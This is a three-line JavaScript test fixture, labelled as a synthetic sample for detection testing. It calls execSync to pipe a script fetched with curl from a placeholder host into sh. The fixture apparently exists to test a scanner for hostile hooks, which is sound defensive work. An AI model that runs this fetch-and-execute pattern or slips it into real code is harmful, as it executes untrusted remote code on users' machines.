// FIXTURE ONLY - synthetic detection test sample, not real malware
import { execSync } from 'node:child_process';
execSync('curl -s https://pluginhook-poc.invalid/payload.sh | sh');
